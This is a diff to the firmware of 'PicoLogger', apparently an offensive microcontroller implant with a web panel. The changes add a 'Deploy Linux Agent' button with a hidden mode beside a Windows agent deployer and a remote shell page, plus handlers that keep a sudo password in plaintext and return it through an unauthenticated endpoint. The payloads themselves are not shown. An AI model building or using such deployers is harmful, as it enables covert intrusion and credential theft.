@@ -277,6 +277,13 @@ void handleSettingsPage() {
                         .catch(err => alert('Failed to format LittleFS!'));
                 }
             }
+            function rebootPico() {
+                if (confirm('Are you sure you want reboot PicoLogger?')) {
+                    fetch('/reboot_pico', { method: 'POST' })
+                        .then(() => alert('Restarting PicoLogger!'))
+                        .catch(err => alert('Failed to restart PicoLogger!'));
+                }
+            }
             window.onload = function() {
                 fetch('/load_settings')
                     .then(response => response.json())
@@ -329,6 +336,7 @@ void handleSettingsPage() {
             </div>
             <button onclick="saveSettings()">Save</button>
             <button onclick="formatLittleFS()" class="warning">Format LittleFS</button>
+            <button onclick="rebootPico()" class="warning">Reboot PicoLogger</button>
         </div>
         <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
     </body>
@@ -519,10 +527,10 @@ void handleShell() {
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
             h2{text-align:center;color:#fc0}
             textarea{box-sizing:border-box;width:100%;height:250px;padding:10px;border-radius:5px;border:none;background:#333;color:#fff}
-            input{width:80%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;font-size:16px}
-            button{width:15%;padding:10px;margin-left:5px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
+            input{width:70%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;font-size:16px}
+            button{width:20%;padding:10px;margin-left:5px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s;height: 42px;}
             button:hover{background:#fa0}
-            .switch-container{display:flex;justify-content:center;gap:20px;margin:15px 0}
+            .switch-container{display:flex;justify-content:center;gap:10px;margin:10px 0}
             .switch{position:relative;display:inline-block;width:60px;height:34px}
             .switch input{opacity:0;width:0;height:0}
             .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#444;transition:.4s;border-radius:34px}
@@ -535,6 +543,28 @@ void handleShell() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function loadPassword() {
+                fetch('/get_password')
+                    .then(response => response.text())
+                    .then(password => {
+                        document.getElementById("passwordInput").value = password;
+                    })
+                    .catch(error => console.error('Error loading password:', error));
+            }            
+            function deployBashAgent() {
+                let password = document.getElementById("passwordInput").value;
+                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
+                fetch('/deploy_linux', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'password=' + encodeURIComponent(password) + '&hidden=' + hiddenMode
+                })
+                .then(response => response.text())
+                .then(output => {
+                    alert(output);
+                })
+                .catch(error => console.error('Error deploying bash agent:', error));
+            }
             function deployAgent() {
                 let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                 let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
@@ -566,6 +596,7 @@ void handleShell() {
                 })
                 .catch(error => console.error('Error executing command:', error));
             }
+            document.addEventListener("DOMContentLoaded", loadPassword);
             document.addEventListener("DOMContentLoaded", function() {
                 document.getElementById("commandInput").addEventListener("keypress", function(event) {
                     if (event.key === "Enter") {
@@ -615,7 +646,11 @@ void handleShell() {
                         <span class="slider"></span>
                     </label>
                 </label>
-                <button onclick="deployAgent()">Deploy Agent</button>
+                <button onclick="deployAgent()">Deploy Windows Agent</button>
+                <button onclick="deployBashAgent()">Deploy Linux Agent</button>
+                <input type="text" id="passwordInput" placeholder="Enter sudo password..." style="width: 20%;">
+            </div>
+        </div>
         <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
     </body>
     </html>
@@ -623,6 +658,35 @@ void handleShell() {
     server.send(200, "text/html", page);
 }
 
+void handleUpdatePassword() {
+    if (server.hasArg("password")) {
+        String newPassword = server.arg("password");
+        File sudoFile = LittleFS.open("/sudo.txt", "w");
+        if (sudoFile) {
+            sudoFile.println(newPassword);
+            sudoFile.close();
+            server.send(200, "text/plain", "Password updated!");
+        } else {
+            server.send(500, "text/plain", "Error updating password.");
+        }
+    } else {
+        server.send(400, "text/plain", "Password not provided.");
+    }
+}
+
+void handleGetPassword() {
+    String password;
+    File sudoFile = LittleFS.open("/sudo.txt", "r");
+
+    if (sudoFile) {
+        password = sudoFile.readStringUntil('\n');
+        sudoFile.close();
+    } else {
+        password = "";
+    }
+
+    server.send(200, "text/plain", password);
+}
 
 // =========================================================== Screenshot Page =================================================================
 void handleScreenPage() {
@@ -637,9 +701,10 @@ void handleScreenPage() {
             .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
             .top-bar a:hover{background:#666}
             .container{margin:20px auto;width:80%;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
+            h2{text-align:center;color:#fc0}
             input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
             img{max-width:100%;border-radius:5px;margin-top:10px;display:none}
-            button{padding:10px 20px;background:#fc0;border:none;font-size:16px;cursor:pointer;border-radius:5px;margin-top:10px}
+            button{padding:10px 20px;background:#fc0;border:none;font-size:16px;font-weight:700;cursor:pointer;border-radius:5px;margin-top:10px}
             button:hover{background:#fa0}
             .switch-container{display:flex;justify-content:center;gap:20px;margin:15px 0}
             .switch{position:relative;display:inline-block;width:60px;height:34px}
